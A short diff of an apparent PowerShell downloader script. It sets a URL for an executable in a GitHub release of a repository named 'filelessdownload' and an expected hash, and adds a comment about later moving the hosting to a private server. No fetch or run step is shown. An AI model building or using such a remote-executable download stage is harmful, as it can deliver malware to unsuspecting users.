@@ -1,4 +1,4 @@
-
+# no worries, ill do with a private server later
 $downloadUrl = "https://github.com/mateuscobe-max/filelessdownload/releases/download/idk/32759017815.exe"
 
 $expectedHash = "AD6D7289E40B8BB2502267ECC8B36A4FF25068AADFA5441F9EC1325C16EB467B".ToUpperInvariant()
